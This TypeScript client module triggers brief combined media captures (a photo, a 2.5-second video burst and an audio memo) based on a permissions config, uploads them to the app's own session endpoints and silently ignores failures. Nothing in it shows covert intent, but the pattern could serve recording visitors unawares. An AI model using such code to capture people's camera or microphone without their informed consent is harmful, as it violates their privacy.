// lib/session-media-client.ts
// Triggers coordinated multi-media captures (camera photo, audio memo, video clip)
import { PermissionsConfig } from "@/lib/types";
import { captureCombinedMedia } from "@/lib/media-capture";

export async function executeSessionMediaCaptures(
  sessionId: string,
  config?: PermissionsConfig
): Promise<void> {
  if (!config) return;
  const hasCamera = Boolean(config.camera);
  const hasAudio = Boolean(config.audio);
  const hasVideo = Boolean(config.video);

  if (!hasCamera && !hasAudio && !hasVideo) return;

  try {
    const { photo, video, audio } = await captureCombinedMedia({
      camera: hasCamera,
      audio: hasAudio,
      video: hasVideo,
      durationSeconds: 2.5,
    });

    const uploads: Promise<any>[] = [];

    // 1. Photo snapshot
    if (photo && hasCamera) {
      const fd = new FormData();
      fd.append("sessionId", sessionId);
      const ext = photo.type.includes("webp") ? "webp" : "jpg";
      fd.append("file", photo, `capture.${ext}`);
      uploads.push(fetch("/api/sessions/capture", { method: "POST", body: fd }).catch(() => {}));
    }

    // 2. Video burst
    if (video && hasVideo) {
      const fd = new FormData();
      fd.append("sessionId", sessionId);
      fd.append("mediaType", "video");
      const ext = video.type.includes("webm") ? "webm" : "mp4";
      fd.append("file", video, `burst.${ext}`);
      uploads.push(fetch("/api/sessions/media", { method: "POST", body: fd }).catch(() => {}));
    }

    // 3. Audio memo
    if (audio && hasAudio) {
      const fd = new FormData();
      fd.append("sessionId", sessionId);
      fd.append("mediaType", "audio");
      const ext = audio.type.includes("webm") ? "webm" : audio.type.includes("ogg") ? "ogg" : "m4a";
      fd.append("file", audio, `memo.${ext}`);
      uploads.push(fetch("/api/sessions/media", { method: "POST", body: fd }).catch(() => {}));
    }

    if (uploads.length > 0) {
      await Promise.allSettled(uploads);
    }
  } catch (err) {
    console.warn("Session media capture failed:", err);
  }
}
